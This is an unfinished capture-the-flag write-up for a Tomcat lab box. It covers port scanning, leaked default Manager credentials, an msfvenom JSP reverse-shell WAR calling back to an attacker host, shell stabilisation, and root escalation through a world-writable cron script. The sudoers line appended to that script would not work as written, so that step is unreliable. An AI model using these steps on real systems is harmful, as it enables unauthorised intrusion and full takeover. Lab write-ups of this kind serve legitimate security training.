# bsidesgtthompson

**Status:** WIP / pending final proof.
**Note:** Exploitation and privesc are documented, but final evidence/flag closure is missing.

## Recon
```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sVC -p22,8009,8080 $TARGET -oN service
```

**Output**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 8009 runs the AJP protocol — Tomcat vulnerable to Ghostcat (CVE-2020-1938)


### Tomcat Manager Discovery
Browsing `http://10.128.177.148:8080/manager` — attempting login with random credentials triggers an error page that leaks default credentials:
```
tomcat
s3cret
```
### WAR Upload RCE
The Manager interface supports WAR file upload. `msfvenom` generates a reverse shell payload:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.x.x.x LPORT=4444 -f war -o reverse.war
```

### Deploy and trigger the payload
```bash
nc -lvnp 4444
curl http://$TARGET:8080/reverse/
```


Stabilise:
```bash
# What it does: spawn an interactive bash shell using Python.
# Why here: stabilize the raw netcat shell to allow for tab completion and job control.
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```
## Enumeration
```bash
cat /etc/passwd
sudo -l 
id 
cd /home/jack
cat user.txt
cat /etc/crontab
```
**Output**
```
monthly )
*  *    * * *   root    cd /home/jack && bash id.sh
```
### Cron job in jack's home runs as root
```bash
ls -lha
```
**Output**
```
-rwxrwxrwx 1 jack jack   45 May 17 05:38 id.sh
```

### The script is world-writable but only root executes it via cron
```bash
echo "cat /root/root.txt > root.txt" >> id.sh
echo "tomcat ALL=(ALL) NOPASSWD: ALL" >> id.sh
```



## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [msfvenom](../../../tools/exploitation/msfvenom.md)
- [netcat](../../../tools/pivot/netcat.md)
- [Tomcat Manager WAR upload RCE](../../../exploits/web-rce/tomcat-manager-war-upload.md)
- [JSP WAR reverse shell](../../../payloads/webshells/jsp-war-reverse-shell.md)
- [Python PTY stabilization](../../../payloads/shell-stabilization/python-pty.md)
